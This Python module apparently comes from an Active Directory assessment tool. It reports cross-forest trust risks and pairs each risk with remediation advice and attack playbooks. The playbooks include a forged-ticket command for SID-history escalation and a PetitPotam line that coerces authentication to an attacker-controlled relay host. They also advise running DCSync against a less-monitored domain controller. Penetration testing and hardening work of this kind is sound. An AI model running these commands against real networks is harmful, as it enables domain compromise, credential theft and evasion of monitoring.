#!/usr/bin/env python3
"""AD Architecture, Trusts, and Stealth Analyzers."""

from __future__ import annotations
from typing import Optional

from ..models import ObjectStore
from ..theme import Severity
from .base import BaseAnalyzer, Finding


class ADArchitectureAnalyzer(BaseAnalyzer):
    name = "ad_architecture"
    description = "Analyze cross-forest trusts, shadow principals, and DCSync stealth targets"

    def analyze(self, store: ObjectStore) -> Optional[Finding]:
        data = []
        for domain in store.iter_by_type("domain"):
            trusts = domain.extras.get("trusts", [])
            for t in trusts:
                data.append({"name": f"{domain.name} -> {t.get('TargetDomainName')}", "type": "Trust", "sid": domain.sid})

        if not data:
            # Check for shadow principals or webclient coercion capabilities
            pass

        # Since this is a specialized playbook delivery analyzer, we will output it if there's any domain
        if not data and list(store.iter_by_type("domain")):
             data.append({"name": "Architecture Scan", "type": "Global", "sid": "N/A"})

        if not data:
            return None

        return Finding(
            title="AD Architecture & Trust Exploitation",
            summary=f"Analyzed architecture for Cross-Forest, Shadow Principal, and Coercion vectors.",
            severity=Severity.HIGH,
            data=data,
            recommendation="AD Architecture & Trust Abuse",
            eli5="Cross-Forest SID History hopping allows attackers to compromise an Enterprise by forging a ticket with a SID from a parent domain. Shadow Principals (PAM Trusts) map accounts from a bastion forest into a production forest, and WebClient/WebDAV coercion allows bypassing SMB signing requirements by coercing authentication over HTTP.",
            remediation="Enable SID Filter Quarantine on all inter-forest trusts. Implement strict PAM trust boundaries. Disable the WebClient service on all workstations and servers to mitigate HTTP-based NTLM coercion.",
            playbooks=[
                "# Cross-Forest SID History Hopping:\n# Forge a ticket with the Enterprise Admin SID (-519) of the parent domain:\nimpacket-ticketer -user administrator -domain <CHILD_DOMAIN> -domain-sid <CHILD_SID> -nthash <CHILD_KRBTGT> -extra-sid <PARENT_SID>-519",
                "# Shadow Principal & PAM Trust Mapping:\n# Enumerate shadow principals in the Bastion forest:\nGet-ADObject -SearchBase 'CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=local' -Filter *",
                "# DCSync Target Optimization:\n# Rather than targeting the PDC, target an older/less monitored DC (e.g., outdated OS, no EDR).",
                "# WebClient / WebDAV Coercion (Bypasses SMB Signing):\n# Coerce HTTP auth to your NTLM relay:\npython3 PetitPotam.py -u '<DOMAIN_USER>' -p '<PASSWORD>' <ATTACKER_HOST>@80/test <TARGET_HOST>"
            ]
        )
